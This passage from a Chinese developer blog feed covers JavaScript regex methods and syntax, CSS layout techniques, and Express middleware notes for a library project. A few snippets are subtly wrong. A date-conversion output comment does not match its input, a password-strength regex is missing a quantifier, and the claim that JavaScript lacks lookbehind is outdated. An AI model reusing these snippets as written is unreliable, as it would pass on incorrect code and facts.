/Ab|BC/g; //pattern.lastIndex = 1; //改变lastIndex属性 console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex);&#125;() 字符串方法strObj.search(RegObj)search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串。search() 方法不执行全局匹配，它将忽略标志 g。它同时忽略 regexp 的 lastIndex属性，并且总是从字符串的开始进行检索，这意味着它总是返回 stringObject 的第一个匹配的位置。没有匹配则返回-1。 12345678910var search = function()&#123; var text = &quot;asdfasAAAAAA&quot;; var pattern = /AA/g; var te = &quot;AA&quot; console.log(text.search(pattern)); console.log(text.indexOf(te)); var example = &quot;adfasd9ad1s1f&quot;; var pattern2 = /\d/g; console.log(example.charAt(example.search(pattern2)))；&#125;() strObj.match(RegObj)字符串对象的match方法与正则对象的exec方法比较类似，但是如果正则表达式带有g修饰符，那么match方法就可以以数组的方式返回所有成功匹配的结果，但是exec方法只返回了一个。如果不带g，则是返回其分组结果。 12345var match = function()&#123; var text=&quot;asdfasdasdfasdfadsf&quot; var pattern = /a(sd)/g; console.log(text.match(pattern))&#125;() strObj.replace(regObj,replaceStr|function(){})1stringObject.replace(regexp/substr,replacement) 字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 replacement 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。 replacement 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 $ 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。 字符 替换文本 \$1、\$2、…、\$99 与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。 \$&amp; 与 regexp 相匹配的子串。 \$` 位于匹配子串左侧的文本。 \$’ 位于匹配子串右侧的文本。 \$$ 直接量符号。 注意：ECMAScript v3 规定，replace() 方法的参数 replacement 可以是函数而不是字符串。在这种情况下，每个匹配都调用该函数，它返回的字符串将作为替换文本使用。该函数的第一个参数是匹配模式的字符串。接下来的参数是与模式中的子表达式匹配的字符串，可以有 0 个或多个这样的参数。接下来的参数是一个整数，声明了匹配在 stringObject 中出现的位置。最后一个参数是 stringObject 本身。1234567891011121314//不使用正则var replace = function()&#123; var text = &apos;1&lt;%2%&gt;34&lt;%567%&gt;89&apos;; text = text.replace(&apos;&lt;&apos;,&apos;@&apos;); text = text.replace(&apos;%&apos;,&apos;#&apos;); text = text.replace(&apos;&gt;&apos;,&apos;@&apos;); console.log(text);&#125;()//使用正则var replace = function()&#123; var text = &apos;1&lt;%2%&gt;34&lt;%567%&gt;89&apos;; text = text.replace(/&lt;%(\d+)%&gt;/g,&apos;@#$1#@&apos;); console.log(text);&#125;() strObj.split(regObj)1stringObject.split(separator,howmany) 一个字符串数组。该数组是通过在 separator 指定的边界处将字符串 stringObject 分割成子串创建的。返回的数组中的字串不包括 separator 自身。 但是，如果 separator 是包含子表达式的正则表达式，那么返回的数组中包括与这些子表达式匹配的字串（但不包括与整个正则表达式匹配的文本）。123456var split = function()&#123; text = &apos;a1b2c3d&apos; console.log(text.split(/\d/)); name = &quot;asfasdf,fadf./asdf.asdf[asdf&quot; console.log(name.split(/\W/));&#125;() 语法元字符( [ { \ ^ $ | ) ? * + . 预定义的特殊字符 字符 描述 \t 制表符 \n 换行符 \r 回车符 \f 换页符 \a alert字符 \e escape字符 \cX / 与X相对应的控制字符 \b 与回退字符 \v 垂直制表符 \0 空字符 分枝条件继续在分组上做文章。在分组中插入管道符（“|”），把它划分为两个或多个候多项。1234var reg = /(red|black|yellow)!!/;alert(reg.test(&quot;red!!&quot;))//truealert(reg.test(&quot;black!!&quot;))//truealert(reg.test(&quot;yellow!!&quot;))//true 边界一个要与字符类合用的东西。 边界|正则 |名称| 描述||—|—|—||^| 开头| 注意不能紧跟于左中括号的后面||$| 结尾||\b| 单词边界| 指[a-zA-Z_0-9]之外的字符||\B |非单词边界 |单词边界举例。要匹配的东西的前端或未端不能为英文字母阿拉伯字数字或下横线。12var str = &quot;12w-eefd&amp;efrew&quot;;alert(str.match(/\b\w+\b/g))//12w,eefd,efrew 字符类简单类原则上正则的一个字符对应一个字符，我们可以用[]把它们括起来，让[]这个整体对应一个字符。如12345alert(/abc/.test(&quot;abc&quot;));//truealert(/[abc]/.test(&quot;a&quot;));//truealert(/[abc]/.test(&quot;b&quot;));//truealert(/[abc]/.test(&quot;c&quot;));//truealert(&quot;a bat ,a Cat,a fAt bat ,a faT cat&quot;.match(/[bcf]at/gi));//bat,Cat,fAt,bat,faT,cat 负向类在[]前面加个元字符^进行取反，表示匹配不能为括号里面的字符。1234alert(/[^abc]/.test(&quot;a&quot;));//falsealert(/[^abc]/.test(&quot;b&quot;));//falsealert(/[^abc]/.test(&quot;6&quot;));//truealert(/[^abc]/.test(&quot;gg&quot;));//true 范围类还是在那个中括号里面做文章。有时匹配的东西过多，而且类型又相同，全部输入太麻烦，我们可以用它。特征就是在中间加了个横线。12345alert(/[a-f]/.test(&quot;b&quot;));//truealert(/[a-f]/.test(&quot;g&quot;));//falsealert(/[a-z]/.test(&quot;h&quot;));//truealert(/[0-9]/.test(&quot;8&quot;));//truealert(/[0-9]/.test(&quot;a&quot;));//false 组合类中括号内可以组合使用不同类型的单个字符。1234567alert(/[^H-Y]/.test(&quot;G&quot;));//truealert(/[^7-9]/.test(&quot;6&quot;));//truealert(/[a-m1-5\n]/.test(&quot;a&quot;))//truealert(/[a-m1-5\n]/.test(&quot;3&quot;))//truealert(/[a-m1-5\n]/.test(&quot;\n&quot;))//truealert(/[a-m1-5\n]/.test(&quot;r&quot;))//false 预定义类使用反义字符代替某些常用的组合集 字符 等同于 描述 . [^\n\r] 除了换行和回车之外的任意字符 \d [0-9] 数字字符 \D [^0-9] 非数字字符 \s [ \t\n\x0B\f\r] 空白字符 \S [^ \t\n\x0B\f\r] 非空白字符 \w [a-zA-Z_0-9] 单词字符(所有的字母) \W [^a-zA-Z_0-9] 非单词字符 量词（限定符） 代码 描述 ? 出现零次或一次 * 出现零次或多次(任意次) + 出现一次或多次（至少一次） {n} 对应零次或者n次 {n,m} 至少出现n次但不超过m次 {n,} 至少出现n次(+的升级版) 1234567891011alert(/...../.test(&quot;正则表达式&quot;))//truealert(/正则表达式/.test(&quot;正则表达式&quot;))//truealert(/[\u4e00-\u9fa5]&#123;5&#125;/.test(&quot;正则表达式&quot;))//truealert(/[\u4e00-\u9fa5]&#123;4&#125;/.test(&quot;正则表达式55&quot;))//truealert(/^[\u4e00-\u9fa5]+$/.test(&quot;正则表达式&quot;))//truealert(/^[\u4e00-\u9fa5]+$/.test(&quot;正则表达式#&quot;)) //falsealert(/\d&#123;6&#125;/.test(&quot;123456&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;ee&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;ex&quot;))//truealert(/[regx]&#123;2&#125;/.test(&quot;xx&quot;))//true 1/[\u4e00-\u9fa5]/ //用于匹配单个汉字。这两个unicode值正好是Unicode表中的汉字的头和尾。 贪婪量词，懒惰量词与支配性量词贪婪量词: 当正则表达式中包含能接受重复量词时，默认的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。1alert(&quot;aabab&quot;.match(/a.*b/g))//aabab 懒惰量词:在量词后加？，也就是匹配尽可能少的字符。其工作方式与贪婪量词相反。123alert(&quot;abaab&quot;.match(/a.*?b/g))//为什么第一个匹配是aab（第一到第三个字符）而不是ab（第二到第三个字符）？简单地说，因为正则表达式有另一条规则，比懒惰／贪婪规则的优先级更高：最先开始的匹配拥有最高的优先权——The match that begins earliest wins。 表5.懒惰限定符|代码| 描述||—|—||*? |重复任意次，但尽可能少重复||+?| 重复1次或更多次，但尽可能少重复||??| 重复0次或1次，但尽可能少重复||{n,m}?| 重复n到m次，但尽可能少重复||{n,}? |重复n次以上，但尽可能少重复| 支配性量词，在简单量词后加+。支配性量词只尝试一次。但是javascript不支持。 分组到目前为止，我们接触到中括号表示范围内选择，大括号表示重复。小括号就可以表示分组，用作多字符的重复。 123456789//分组+量词alert(/(dog)&#123;2&#125;/.test(&quot;dogdog&quot;))//true//分组+范围alert(&quot;baddad&quot;.match(/([bd]ad?)*?/g))//baddad,dad//分组+分组alert(&quot;mon and dad&quot;.match(/(mon( and dad)?)/))//mon and dad,mon and dad, and dad//man and dad 是符合正则模式的，而 and dad 是正则的一个分组] 捕获性分组所有分组默认都是捕获性分组，当使用match或者exec方法不带全局属性的时候，就可以在返回数组的第1位开始捕获到符合分组的内容。123456789101112131415161718192021222324 var reg = /test(\d+)/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;001&quot;, index: 0, input: &quot;test001&quot;] var reg = /test(\d+)/g; var str = &apos;test001 test002&apos;; console.log(str.match(reg)); //[&quot;test001&quot;, &quot;test002&quot;] var reg = /test(\d)+/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;] var reg = /test(\d)+/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;]var reg = /test(\d)+?/; var str = &apos;test001 test002&apos;; console.log(str.match(reg));//[&quot;test0&quot;, &quot;0&quot;, index: 0, input: &quot;test001&quot;] 反向引用捕获会返回一个捕获组，这个分组是保存在内存中，不仅可以在正则表达式外部通过程序进行引用，也可以在正则表达式内部进行引用，这种引用方式就是反向引用。 反向引用标识由正则表达式中的匹配组捕获性分组。每个反向引用都由一个编号或名称来标识，并通过“\编号”表示法进行引用。（MDN不推荐使用）123456789var color = &quot;#990000&quot;;/#(\d+)/.test(color);alert(RegExp.$1);//990000 alert(/(dog)\1/.test(&quot;dogdog&quot;))//true var num = &quot;1234 5678&quot;;var newNum = num.replace(/(\d&#123;4&#125;) (\d&#123;4&#125;)/,&quot;$2 $1&quot;);alert(newNum) 你也可以自己指定分组的组名。要指定一个分组的组名，请使用这样的语法：(?&lt; name &gt;exp)这样就把这部分表达式的组名指定为Word了。要反向引用这个分组捕获的内容，你可以使用\${name}来调用匹配到的内容 使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些：|代码| 说明||—|—||(exp) |匹配exp,并捕获文本到自动命名的组里||(?&lt; name >exp)| 匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp)||(?:exp)| 匹配exp,不捕获匹配的文本，也不给此分组分配组号| 非捕获性分组并不是所有分组都能创建反向引用，有一种特别的分组称之为非捕获性分组，它是不会创建反向引用。反之，就是捕获性分组。要创建一个非捕获性分组，只要在分组的左括号的后面紧跟一个问号与冒号就行了。使用match、exec方法的时候就不会捕获到分组的内容。1234var reg = /test(?:\d)+/; var str = &apos;test001&apos;; console.log(str.match(reg));//[&quot;test001&quot;, index: 0, input: &quot;test001&quot;] 零宽断言 断言：俗话的断言就是“我断定什么什么”，而正则中的断言，就是说正则可以指明在指定的内容的前面或后面会出现满足指定规则的内容.意思正则也可以像人类那样断定什么什么，比如”ss1aa2bb3”,正则可以用断言找出aa2前面有bb3，也可以找出aa2后面有ss1. 零宽：就是没有宽度，在正则中，断言只是匹配位置，不占字符，也就是说，匹配结果里是不会返回断言本身。 正则 名称 描述 (?=exp) 正向前瞻 匹配exp前面的位置 (?!exp) 负向前瞻 匹配后面不是exp的位置 (?&lt;=exp) 正向后瞻 匹配exp后面的位置 JavaScript不支持 (?&lt;!exp) 负向后瞻 匹配前面不是exp的位置 JavaScript不支持 正向前瞻用来检查接下来的出现的是不是某个特定的字符集。而负向前瞻则是检查接下来的不应该出现的特定字符串集。零宽断言是不会被捕获的。 123456789101112var str1 = &quot;bedroom&quot;;var str2 = &quot;bedding&quot;;var reBed = /(bed(?=room))///在我们捕获bed这个字符串时，抢先去看接下来的字符串是不是roomalert(reBed.test(str1));//truealert(RegExp.$1)//bedalert(RegExp.$2 === &quot;&quot;)//truealert(reBed.test(str2))//falsevar str1 = &quot;bedroom&quot;;var str2 = &quot;bedding&quot;;var reBed = /(bed(?!room))/ //要来它后面不能是roomalert(reBed.test(str1))//falsealert(reBed.test(str2))//true 小练习检验QQ号码： [1-9][0-9]{4,14} 手机号码：^(13[0-9]|14[57]|15[0-35-9]|18[0-35-9])\d{8}$ 身份证：^([0-9]){7,18}(x|X)?$ 密码：^[a-zA-Z]\w{5,17}$ 字母开头，长度在6~18之间，只能包含字母、数字和下划线 强密码：^(?=.\d)(?=.[a-z])(?=.*[A-Z]).{8,10}$ 包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间电话号码验证码/^[a-zA-z0-9]{4}$]/IP地址邮箱网址 单词首字母大写1234567var a = &quot;asdf&quot;; String.prototype.capitalize = function () &#123; return this.replace(/^\w/, function (s) &#123; return s.toUpperCase(); &#125;); &#125;alert(a.capitalize())//Asdf 12345678910111213var replace = function()&#123; var text = &quot;javascript Tutorial&quot;; console.log(text.replace(/\S/ig, &apos;($&amp;)&apos;));&#125;() var replace = function()&#123; var name = &quot;Doe, John&quot;; console.log(name.replace(/(\w+)\s*, \s*(\w+)/, &quot;$2 $1&quot;)); var str = &apos;aaa bbb ccc&apos;; console.log(str.replace(/\b\w+\b/g, function(word)&#123; return word.substring(0,1).toUpperCase()+word.substring(1);&#125; )) &#125;() 月日年变日月年12345&quot;04-22-2018&quot;.replace(/(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)-(?&lt;year&gt;\d&#123;4&#125;)/, (...args) =&gt; &#123; const groups = args.slice(-1)[0] const &#123;day, month, year&#125; = groups return `$&#123;day&#125;-$&#123;month&#125;-$&#123;year&#125;`&#125;) // &quot;25-04-2017&quot; 题目，移除所有标签，只留下innerText!123var html = &quot;&lt;p&gt;&lt;a href=&apos;http://www.cnblogs.com/rubylouvre/&apos;&gt;Ruby Louvre&lt;/a&gt;by &lt;em&gt;正则表达式&lt;/em&gt;&lt;/p&gt;&quot;;var text = html.replace(/&lt;(.|\s)*?&gt;/g, &quot;&quot;);alert(text)//Ruby Louvreby 正则表达式 官方教程微软：.NET 正则表达式MSDNW3CSCHOOL 正则表达式基本语法 参考资料正则表达式30分钟入门教程JavaScript 正则表达式上——基本语法JavaScript正则表达式下——相关方法js正则表达式/replace替换变量方法65条最常用正则表达式 你要的都在这里了JavaScript replace() 方法JavaScript split() 方法、javascript正则表达式JS 正则中的命名捕获分组javascript正则表达式中分组详解pattern–HTML5的表单验证属性 https://zhuanlan.zhihu.com/p/83876910?utm_source=qq&amp;utm_medium=social&amp;utm_oi=549346247203553280]]></content>
      <categories>
        <category>Algorithms</category>
      </categories>
      <tags>
        <tag>Algorithms</tag>
        <tag>RegExp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各种方式进行网页布局]]></title>
    <url>%2F2018%2F05%2F03%2Flayouts%2F</url>
    <content type="text"><![CDATA[前言 网页布局 静态布局意思就是只是针对某个屏幕下设计的网页，当屏幕大小改变时，页面布局不会发生变化，就像经常所看到的滚动条。 自适应布局特点是分别为不同的屏幕设置布局格式，当屏幕大小改变时，会出现不同的布局，意思就是在这个屏幕下这个元素块在这个地方，但是在那个屏幕下，这个元素块又会出现在那个地方。只是布局改变，元素不变。可以看成是不同屏幕下由多个静态布局组成的。 使用了媒体查询1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; 流式布局特点是随着屏幕的改变，页面的布局没有发生大的变化，可以进行适配调整，这个正好与自适应布局相补。 PC端常见布局 浮动布局floatBFC 即 Block Formatting Contexts (块级格式化上下文)Formatting context(格式化上下文) 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。 只要元素满足下面任一条件即可触发 BFC 特性： body 根元素 浮动元素：float 除 none 以外的值 绝对定位元素：position (absolute、fixed) display 为 inline-block、table-cells、flex overflow 除了 visible 以外的值 (hidden、auto、scroll) 特性 同一个 BFC 下外边距会发生折叠 BFC 可以包含浮动的元素（清除浮动，使浮动在BFC盒子内） BFC 可以阻止元素被浮动元素覆盖（清除浮动，BFC盒子内不受外部浮动影响） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;float&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .float .left&#123; width:300px; float:left; &#125; .float .right&#123; width:25%; float:right; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;float&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;FL&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;FR&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;FM&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 定位布局position123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;position&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .position .left&#123; width:300px; position: absolute; left:8px; &#125; .position .right&#123; width:25%; position: absolute; right:8px; &#125; .position .mid&#123; margin:0 25% 0 300px; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;position&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;PL&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;PR&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;PM&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 表格布局table缺点： table比其它html标记占更多的字节。(造成下载时间延迟,占用服务器更多流量资源) table会阻挡浏览器渲染引擎的渲染顺序。(会延迟页面的生成速度,让用户等待更久的时间) table里显示图片时需要你把单个、有逻辑性的的图片切成多个图。(增加设计的复杂度,增加页面加载时间,增加http会话数) 在某些浏览器中,table里的文字的拷贝会出现问题。(会让用户不悦) table会影响其内部的某些布局属性的生效(比如里的元素的height:100%) (限制页面设计的自由性) 一旦学了CSS的知识,你会发现使用table做页面布局会变得更麻烦。(先花时间学一些CSS知识,会省去你以后大量的时间) ‘table对’对于页面布局来说,从语义上看是不正确的。(它描述的是表现,而不是内容) table代码会让阅读者抓狂。(不但无法利用CSS,而且会不知所云,尤其在进行页面改版或内容抽取的时候) table一旦设计完成就变成死的,很难通过CSS让它展现新的面貌。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;table&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; table&#123; width:100%; &#125; table .left&#123; width:300px; &#125; table .mid&#123; margin:0 25%; &#125; table .right&#123; width:25%; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;td class=&quot;top&quot; colspan=&quot;3&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;left&quot;&gt;TL&lt;/td&gt; &lt;td class=&quot;mid&quot;&gt;TM&lt;/td&gt; &lt;td class=&quot;right&quot;&gt;TR&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;bottom&quot; colspan=&quot;3&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 弹性布局flex弹性布局重点在单一横排和单一竖排的样式应用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;flex&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .flex&#123; display:flex; flex-direction: column; &#125; .flex .top,.flex .bottom&#123; flex:1; &#125; .flex .main&#123; display: flex; &#125; .flex .mid&#123; flex:1; &#125; .flex .left&#123; width:300px; min-width: 100px; &#125; .flex .right&#123; width:25%; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;left&quot;&gt;FL&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;FM&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;FR&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 网格布局gridgrid-area是应用的重点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;grid&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .top&#123; grid-area: top; &#125; .left&#123; grid-area: left; &#125; .mid&#123; grid-area: mid; &#125; .right&#123; grid-area: right; &#125; .bottom&#123; grid-area: bottom; &#125; .grid&#123; display: grid; grid-template-columns: 300px 3fr 1fr; grid-template-rows:auto; grid-template-areas: &quot;top top top&quot; &quot;left mid right&quot; &quot;bottom bottom bottom&quot; ; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;grid&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;GL&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;GM&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;GR&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 响应式布局就是分别为不同的屏幕设计的布局方式，可以理解成自适应布局和流程布局的结合。 媒体查询+各类流式布局 12@media (max-width: 1200px) &#123;&#125; 在响应式编程中，比较难处理的就是图片。需要针对不同设备的分辨率进行适配，同时要保持较好的兼容性。在处理图片时，有以下的小技巧： 为图像使用相对尺寸，防止它们意外溢出容器。 如果您要根据设备特性（亦称艺术指导）指定不同图像，则使用 picture 元素。 在 img 元素中使用 srcset 及 x 描述符，引导浏览器从不同密度图像中选择、使用最佳的一张。 如果您的页面仅有一两个图像，且这些图像没有在您的网站上的其他地方使用，可考虑使用内联图像以减少文件请求。 我们一个一个来说这些技巧。首先是为图像使用相对尺寸，跟前面的为元素使用相对尺寸一样，防止在小屏幕设备上溢出容器，可以使用 max-width: 100% 来保证图像及其他内容不会从父容器上溢出。同时，为了提高可访问性，需要为img元素添加有意义的alt描述。 其次是img元素的srcset属性，这个属性非常有用，可以针对不同设备特性提供多种图片文件。如果浏览器支持srcset属性，则会在进行任何请求之前对逗号分隔的图像/条件列表进行解析，并且只会下载和显示最合适的图像。在使用时，为了能够兼容不支持srcset属性的浏览器，还需要为img元素指定src。就像下面这样：1&lt;img src=&quot;lighthouse.jpg&quot;srcset=&quot;lighthouse.jpg , lighthouse-2x.jpg 2x&quot;&gt; 另一个很有用的元素是picture，其能根据设备特性更改图像，picture元素定义了一个声明性解决办法，可根据设备大小、设备分辨率、屏幕方向等不同特性来提供一个图像的多个版本，就像video元素一样，可以指定多个源。为了保持兼容以及默认的情况，还可以在picture元素里面嵌套img，非常好用。12345&lt;picture&gt; &lt;source media=&quot;(min-width: 800px)&quot; srcset=&quot;head.jpg, head-2x.jpg 2x&quot;&gt; &lt;source media=&quot;(min-width: 450px)&quot; srcset=&quot;head-small.jpg, head-small-2x.jpg 2x&quot;&gt; &lt;img src=&quot;head-fb.jpg&quot; srcset=&quot;head-fb-2x.jpg 2x&quot; alt=&quot;a head carved out of wood&quot;&gt;&lt;/picture&gt; 同时，在处理图片时，为了减少请求，我们还可以内联图片资源。常见的方案是base64及内联SVG，内联SVG除了能够减少请求外，还能够保持页面缩放时，图片不失真。]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>前端开发</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FHopeLibrarySystem%2F</url>
    <content type="text"><![CDATA[前言 HopeLibrarySystem 项目总结框架express+ejs123// view engine setupapp.set(&apos;views&apos;, path.join(__dirname, &apos;views&apos;));app.set(&apos;view engine&apos;, &apos;ejs&apos;); Express里有个中间件（middleware）的概念。所谓中间件，就是在收到请求后和发送响应之前这个阶段执行的一些函数。 要在一条路由的处理链上插入中间件，可以使用express对象的use方法。该方法原型如下： 1app.use([path,] function [, function...]) 当app.use没有提供path参数时，路径默认为“/”。当你为某个路径安装了中间件，则当以该路径为基础的路径被访问时，都会应用该中间件。比如你为“/abcd”设置了中间件，那么“/abcd/xxx”被访问时也会应用该中间件。 中间件函数的原型如下： 1function (req, res, next) 第一个参数是Request对象req。第二个参数是Response对象res。第三个则是用来驱动中间件调用链的函数next，如果你想让后面的中间件继续处理请求，就需要调用next方法。 给某个路径应用中间件函数的典型调用是这样的： 1234app.use(&apos;/abcd&apos;, function (req, res, next) &#123; console.log(req.baseUrl); next();&#125;) 组件express-session基于express框架专门用于处理session的中间件 只需要用express app的use方法将session挂载在‘/’路径即可，这样所有的路由都可以访问到session。可以给要挂载的session传递不同的option参数，来控制session的不同特性 一旦我们将express-session中间件用use挂载后，我们可以很方便的通过req参数来存储和访问session对象的数据。req.session是一个JSON格式的JavaScript对象，我们可以在使用的过程中随意的增加成员，这些成员会自动的被保存到option参数指定的地方，默认即为内存中去 123456app.use(session(&#123; secret:&apos;hope&apos;,// 对session id 相关的cookie 进行签名 cookie:&#123;maxAge:1000*60*60*24*30&#125;,// 设置 session 的有效时间，单位毫秒,免密码一个月内自动登录 resave: false,// 是否每次都重新保存会话，建议false saveUninitialized: true,// 是否保存未初始化的会话&#125;)); 默认存在内存，store开启存在服务器，如下app会自动替我们把session存入到mongodb数据，而非内存中。 1234567session(&#123; store: new MongoStore(&#123; //创建新的mongodb数据库 host: &apos;localhost&apos;, //数据库的地址，本机的话就是127.0.0.1，也可以是网络主机 port: 27017, //数据库的端口号 db: &apos;test-app&apos; //数据库的名称。 &#125;)&#125;) 由于session是存在服务器端数据库的，所以的它的生命周期可以持久化，而不仅限于浏览器关闭的时间。具体是由cookie.maxAge 决定：如果maxAge设定是1个小时，那么从这个因浏览器访问服务器导致session创建开始后，session会一直保存在服务器端，即使浏览器关闭，session也会继续存在。如果此时服务器宕机，只要开机后数据库没发生不可逆转的破坏，maxAge时间没过期，那么session是可以继续保持的。 当maxAge时间过期后，session会自动的数据库中移除，对应的还有浏览器的cookie。不过，由于connect-mongo的特殊机制（每1分钟检查一次过期session），session的移除可能在时间上会有一定的滞后。 Morganhttp 请求日志记录中间件 使用 app.use(logger(&#39;dev&#39;)); 可以将请求信息打印在控制台，便于开发调试，但实际生产环境中，通常需要将日志记录在日志文件里 将所有的请求记录在 log/ 目录下按每日日期生成的文件中，需要使用 file-stream-rotator 模块： 12345678910111213141516171819202122232425var FileStreamRotator = require(&apos;file-stream-rotator&apos;);var express = require(&apos;express&apos;);var fs = require(&apos;fs&apos;);var logger = require(&apos;morgan&apos;); var app = express();var logDirectory = __dirname + &apos;/log&apos;; // ensure log directory exists fs.existsSync(logDirectory) || fs.mkdirSync(logDirectory); // create a rotating write stream var accessLogStream = FileStreamRotator.getStream(&#123; date_format: &apos;YYYYMMDD&apos;, filename: logDirectory + &apos;/%DATE%.log&apos;, frequency: &apos;daily&apos;, verbose: false&#125;); // setup the logger app.use(logger(&apos;combined&apos;, &#123;stream: accessLogStream&#125;)); app.get(&apos;/&apos;, function (req, res) &#123; res.send(&apos;hello, world!&apos;);&#125;); body-parser处理程序之前，在中间件中对传入的请求体进行解析（response body） 123text 将所有的数据以文本格式字符串的返回 form表单中 text-plainurlencoded(&#123;extended:false&#125;);解析 x-www-form-urlencodedraw解析二进制数据 123456789// create application/json parservar jsonParser = bodyParser.json()// create application/x-www-form-urlencoded parservar urlencodedParser = bodyParser.urlencoded(&#123; extended: false 